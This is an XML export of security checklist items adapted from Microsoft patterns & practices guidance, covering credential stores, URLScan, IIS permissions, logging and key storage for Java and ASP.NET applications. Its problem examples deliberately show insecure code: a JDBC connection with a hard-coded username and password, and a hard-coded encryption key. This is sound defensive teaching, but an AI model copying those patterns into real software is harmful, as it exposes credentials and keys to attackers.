    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that access to the credential store is limited to administrators with the correct privileges.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unauthorized access to the credential store can lead to users' credentials being overwritten; therefore, allowing the attacker to gain access to application resources without obtaining valid credentials prior to the attack.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Follow these steps to ensure that the credential store is properly secured: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all routines that access the store. &lt;/strong&gt;Locate all routines within your application that access the credential store. Such routines include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Authenticating users &lt;/li&gt;&lt;li&gt;Creating users &lt;/li&gt;&lt;li&gt;Modifying users &lt;/li&gt;&lt;li&gt;Changing user passwords&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that credentials for accessing the store are secured. &lt;/strong&gt;
Ensure that your application's access credentials and connection strings are not hard-coded into your application's code base.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If your application &lt;strong&gt;uses a database&lt;/strong&gt; for its credential repository, follow the
&lt;a href="?#ruledisplay:347C1DE9-9132-4B10-9523-64059EAA9F48"&gt;Connection Strings are Secured&lt;/a&gt; checklist to ensure that access credentials and connection strings are secured properly.
&lt;/li&gt;&lt;li&gt;If your application &lt;strong&gt;does not use a database&lt;/strong&gt; for its credential repository, consult the
&lt;a href="?#ruledisplay:FA468EF2-F27F-40B8-BD43-302F66AA9C26"&gt;Plaintext Sensitive Data is Not Stored&lt;/a&gt; checklist. Verify that only the appropriate components of your application are able to access the credential store.&lt;br&gt;
&lt;br&gt;
Example of how &lt;strong&gt;not&lt;/strong&gt; to handle access to the credential store: &lt;/li&gt;&lt;/ul&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;// The application discloses the credentials necessary for accessing the user database&lt;br&gt;DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());&lt;br&gt;Connection cn = DriverManager.getConnection(&amp;quot;jdbc:oracle:thin:@testbox:1521:orcl2&amp;quot;, &amp;quot;myapp&amp;quot;, &amp;quot;pass&amp;quot;); &lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check the access controls for your credential store.&lt;/strong&gt; Ensure that your application's credential store has the appropriate security in place. For instance, if your application uses a database for its credential store, verify that the database
 server is secured properly.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;ol&gt;
&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code authenticates a user based on their credentials. Because the code discloses the credentials to the user database, anybody with access to the code also has&amp;nbsp;access to the credential store.
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt; {&lt;br&gt;      boolean valid;&lt;br&gt;      Connection cn;&lt;br&gt;       // Prepare credentials before querying the credential store&lt;br&gt;      ...&lt;br&gt;       try&lt;br&gt;      {&lt;br&gt;            // The application discloses the credentials necessary for&lt;br&gt;            // accessing the user database&lt;br&gt;            DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());&lt;br&gt;            cn = DriverManager.getConnection(&amp;quot;jdbc:oracle:thin:@testbox:1521:orcl2&amp;quot;,&lt;br&gt;                                              &amp;quot;myapp&amp;quot;, &amp;quot;pass&amp;quot;);&lt;br&gt;            // Query the credential store and perform the rest&lt;br&gt;            // of the authentication steps&lt;br&gt;            ...&lt;br&gt;      }&lt;br&gt;      catch (SQLException se)&lt;br&gt;      {&lt;br&gt;            // Add the appropriate logging and exception handling mechanisms&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;       return valid;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:AEE6B133-B34C-442F-9051-0D8DC51F072E"&gt;Guideline: Limit Access to the Credential Store (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5d43edf0-13de-45c6-b5a0-571049d53469</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>HTTP requests are filtered. URLScan is installed and configured.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that URLScan is installed and configured so that all HTTP requests are filtered.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;URLScan is installed when you run IISLockdown, although you can download it and install it separately.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;IIS 6.0 on Windows Server 2003 has functionality equivalent to URLScan built in. Your decision whether to install UrlScan should be based on your specific organizational requirements. For more information, see &amp;quot;&lt;a href="http://www.microsoft.com/technet/security/tools/urlscan.mspx#eeaa"&gt;Installing
 UrlScan 2.5&lt;/a&gt;.&amp;quot;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;To install URLScan without running IISLockdown&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Download IISlockd.exe from &lt;a href="http://download.microsoft.com/download/iis50/utility/2.1/nt45xp/en-us/iislockd.exe"&gt;
http://download.microsoft.com/download/iis50/Utility/2.1/NT45XP/EN-US/iislockd.exe&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;Run the following command to extract the URLScan setup:
&lt;p&gt;i&lt;strong&gt;islockd.exe /q /c&lt;/strong&gt; &lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;URLScan blocks requests that contain unsafe characters (for example, characters that have been used to exploit vulnerabilities, such as &amp;quot;..&amp;quot; used for directory traversal). URLScan logs requests that contain these characters in the %windir%\system32\inetsrv\urlscan
 directory.&lt;/p&gt;
&lt;p&gt;You configure URLScan using settings in the .ini file %windir%\system32\inetsrv\urlscan\urlscan.ini.&lt;/p&gt;
&lt;p&gt;In addition to blocking malicious requests, you can use URLScan to defend your server against denial of service attacks before the requests reach ASP.NET. To do this, set limits in the
&lt;strong&gt;MaxAllowedContentLength&lt;/strong&gt;, &lt;strong&gt;MaxUrl&lt;/strong&gt;, and &lt;strong&gt;MaxQueryString&lt;/strong&gt; arguments in the URLScan.ini file. For more information, see &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302368.aspx"&gt;How To: Use&amp;nbsp;URLScan&lt;/a&gt;&amp;quot; in
 the &amp;quot;How To&amp;quot; section of this guide.&lt;/p&gt;
&lt;h3&gt;Reversing URLScan Changes&lt;/h3&gt;
&lt;p&gt;There is no automatic operation to remove URLScan. If you have problems with URLScan, you can either remove it from IIS or you can analyze the problem by logging requests that are rejected. To do this, use the option
&lt;strong&gt;RejectResponseUrl=/~*&lt;/strong&gt; in the URLScan .ini file.&lt;/p&gt;
&lt;p&gt;For more information about how to remove ISAPI filters, see &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302432.aspx#c16618429_021"&gt;Step 13. ISAPI Filters&lt;/a&gt;,&amp;quot; later in this chapter.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;p&gt;See the following articles for more information about the URLScan tool: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;For information on running URLScan, see &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302368.aspx"&gt;How To: Use&amp;nbsp;URLScan&lt;/a&gt;&amp;quot; .
&lt;/li&gt;&lt;li&gt;For information about URLScan configuration and the URLScan.ini file settings, see Microsoft Knowledge Base article 326444, &amp;quot;How To: Configure the URLScan Tool.&amp;quot;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>6512ef2a-abb0-410d-9470-8d46df21d130</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>There is script source access only on folders that support content authoring.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that script source access permissions are configured only for folders that allow content authoring.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Web permissions are configured through the IIS snap-in and are maintained in the IIS metabase. They are not NTFS permissions.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Folders that support content authoring should be configured to require authentication and SSL for encryption.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>65b77314-5827-48eb-88be-e739c60f96a7</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>IIS is configured for W3C Extended log file format auditing.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that IIS is configured for W3C Extended log file format auditing.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;You can configure IIS W3C Extended Log File Format Auditing by selecting &lt;strong&gt;
W3C Extended Log File Format&lt;/strong&gt; on the &lt;strong&gt;Web&lt;/strong&gt; &lt;strong&gt;Site&lt;/strong&gt; tab of the Web site's properties dialog box. You can then choose
&lt;strong&gt;Extended Properties&lt;/strong&gt; such as URI Stem and URI Query.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>69f19cab-47b7-4418-ac48-6f8c53a8e1d9</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Include directories do not have Read Web permission.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the include directories do not have the Read Web permission.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Web permissions are configured through the IIS snap-in and are maintained in the IIS metabase. They are not NTFS permissions.&lt;/p&gt;
&lt;p&gt;Use the following Web permissions: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Read Permissions&lt;/strong&gt;. Restrict Read permissions on include directories.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Write and Execute Permissions&lt;/strong&gt;. Restrict Write and Execute permissions on virtual directories that allow anonymous access.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Script source access&lt;/strong&gt;. Configure Script source access permissions only on folders that allow content authoring.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Write&lt;/strong&gt;. Configure Write permissions only on folders that allow content authoring. Grant write access only to content authors.
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Folders that support content authoring should be configured to require authentication and SSL for encryption.&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>6d0a0563-19e5-4a12-9e97-9c906abb3971</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Application is Partitioned into Public and Private Domains</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that there is a boundary defined to separate public and restricted content in both the URL namespace and file system namespace.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Defining a boundary between public and restricted content simplifies the task of user authorization and is generally less prone to error. When the content is separated, server configuration can be used to automatically apply authorization rules without relying
 on the developer to explicitly add checks in the code.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Take the following steps to ensure your application is partitioned into public and restricted domains:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enumerate all web accessible resources.&lt;/strong&gt;&amp;nbsp;Identify the protected resources from the public resources. Common protected resources include, but are not limited to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Resources that require authentication &lt;/li&gt;&lt;li&gt;Critical application resources &lt;/li&gt;&lt;li&gt;Sensitive/confidential data&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check the structure of the URL namespace.&lt;/strong&gt; Ensure that your application's URL namespace is structured properly according to the level of protection and security needs of each resource. Verify that transitions between URL namespaces is performed
 using absolute URLs. For more information, see &lt;a href="http://msdn2.microsoft.com/en-us/library/ms178116(vs.80).aspx"&gt;
ASP.NET Web Site Paths&lt;/a&gt; in MSDN.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check if there is separation on disk between public and protected resources.
&lt;/strong&gt;Examine the local filesystem structure. Ensure that protected resources are not located inside a public directory and vice versa.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that protected resources have the appropriate access controls.&lt;/strong&gt; Use the
&lt;a href="?#ruledisplay:AE79E2C4-186C-47E4-8D05-3C6ECAB2E1AF"&gt;Role-Based Security Checks are Performed&lt;/a&gt; checklist to determine if all protected resources have the appropriate access controls assigned to them.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify the local system permissions for all resources.&lt;/strong&gt; For each resource, check that the local filesystem permissions are set accordingly. If the resource is public, verify that anonymous users can access it. If the resource is protected,
 verify that only authorized users can access it.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;MyApp is a financial tool that generates reports based on sensitive data. It allows the user to upload the financial data and download the report. Since the application is small, all of its content is located within the same directory. The access control
 is enforced by the web application through checking the required permissions before a given call is executed.&lt;/p&gt;
&lt;p&gt;Since both data and code are within the same directory, it may be possible for an attacker to gain access to the raw financial data.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about URL namespaces, see: &lt;a href="http://msdn2.microsoft.com/en-us/library/ms178116(vs.80).aspx"&gt;
ASP.NET Web Site Paths&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:610BAA36-8A3C-404D-81D8-403ED054FEC4"&gt;Guideline: Partition Application Between Public and Private Domains (ASP.NET) (Forms Authentication)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>6d6a0050-9565-4fba-ad79-5d74cc043055</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Log files are configured with an appropriate size depending on the application security requirement.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that log files are configured with an appropriate size depending on the application security requirement.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>7362a10f-f69e-4e4f-a7b0-b8667bfcc710</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Web site content is located on a non-system NTFS volume.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that Web site content is located on a non-system NTFS volume to mitigate the risks associated with unforeseen canonicalization issues and directory traversal attacks.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Do not use the default \inetpub\wwwroot directory. For example, if your system is installed on the C: drive, then move your site and content directory to the D: drive.
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>742e2a98-1175-4456-93b3-3b5b8de9c4e8</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>A Secure Key Storage Location is used</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Deployment Considerations</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that application keys are stored in a well defined location, such as the encrypted sections of the application's web.config or encrypted in the Windows Registry. Verify that they are not hard coded into the application or stored as plaintext inside
 configuration files.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;When faced with encryption, intruders attack the most vulnerable aspect: key management. Because keys are used to generate the encryption that protects sensitive data, the keys themselves become sensitive data that need to be protected.
&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to verify a secure key storage location is used.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the mechanism used for handling encryption keys.&lt;/strong&gt; The mechanism used should be either the Windows Registry or the application's web.config file. Ensure that your application is using the most appropriate mechanism. If the storage
 locations for keys are not properly documented, look for encryption functions in the code and trace the key material back to see where it is stored, both temporarily and permanently. If you do have documentation, check that the code conforms to the documentation.
 When tracing through code, ensure that you look at the entire lifetime of the key in the system; keys may be written out insecurely after they are used, even if the path from a secure initial source to use is correct.&lt;/p&gt;
&lt;p&gt;If you store your application's encryption keys into the Windows Registry, ensure that DPAPI is used to protect them. The following code gives an example of how this can be done:&lt;/p&gt;
&lt;pre&gt;encKey = ProtectedData.Protect(encKey, salt, DataProtectionScope.CurrentUser);&lt;br&gt;RegistryKey rk = Registry.LocalMachine.OpenSubKey(&amp;quot;SOFTWARE\\MyApp\\KeyStore&amp;quot;, true);&lt;br&gt;rk.SetValue(&amp;quot;encKey&amp;quot;, wBuff, RegistryValueKind.Binary);&lt;/pre&gt;
&lt;p&gt;If you store your application's encryption keys into web.config, ensure that they are stored into the
&lt;strong&gt;appSettings&lt;/strong&gt; section. Use the &lt;strong&gt;aspnet_regiis&lt;/strong&gt; utility to check that the
&lt;strong&gt;appSettings&lt;/strong&gt; section is encrypted. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure the key store is protected.&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Ensure that either DPAPI or ASP.NET protected configuration files are being used.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Verify that the appropriate permissions are set on the configuration files and registry keys so they can be only accessed by your application and its administrators.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Verify that only the application and its administrators can access the IIS metabase.&lt;br&gt;
Access to the metabase is controled with ACLs, similar to normal files or registry keys. Verify that only authorized accounts are listed in the &amp;lt;CODE&amp;gt;BUILTIN\Administrators&amp;lt;/CODE&amp;gt; group and that other ACLs are properly set up.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify the application securely handles keys.&lt;/strong&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Ensure that keys are not hard coded into the source code. When tracing back from an encryption or signing operation, if you see private key material included literally in the body of an application's source code, you have&amp;nbsp;found a hard-coded key&amp;nbsp;that needs
 to be moved to a protected keystore.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Ensure that keys are not placed into unprotected configuration files. If a private key is read from a configuration file and the aspnet_regiis utility (or manual inspection) show that it is not encrypted, the key needs to be moved to a protected key store.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Ensure that keys are unloaded from memory after use. If keys are left in memory instead of being cleared out when no longer needed, or if they are written to any form of temporary storage without protection, they are vulnerable to theft from memory or from
 the insecure store. Checking the entire lifetime of key material is important for finding this class of problem.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code shows a hard-coded encryption key inside the application. A determined attacker will be able to compromise the key&amp;nbsp;after gaining&amp;nbsp;access to the source code:&lt;/p&gt;
&lt;pre&gt;byte[] salt = MyApp.Crypto.GenerateSalt();&lt;br&gt;string secretString = &amp;quot;application's encryption key&amp;quot;;&lt;br&gt;HMACSHA512 md = new HMACSHA512(salt);md.Initialize();&lt;br&gt;byte[] rawKey = md.ComputeHash(Encoding.ASCII.GetBytes(secretString));&lt;br&gt;md.Clear();&lt;br&gt; Rijndael encMD = Rijndael.Create();&lt;br&gt;encMD.Key = rawKey;encMD.IV = salt;&lt;br&gt;ICryptoTransform encCT = encMD.CreateEncryptor();&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about the securing the IIS Metabase, see &lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/iissdk/html/3b227030-f79d-4426-b1c0-b5b72e49c9fd.asp"&gt;
Metabase Security&lt;/a&gt;&amp;nbsp;on MSDN.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:440137A2-948A-4485-A137-E3CC8207F801"&gt;Guideline: Use a Secure Key Storage Location (ASP.NET)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>7463d887-2e8f-4342-9e90-231350179003</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Account Administration is Separated from the Main Application Interface</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authorization</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that the account administration interface is separate from the main application interface.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Account administration requires higher privileges than the main application interface. Separating the two interfaces decreases the risk of a normal user being able to escalate privileges to that of an administrator.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
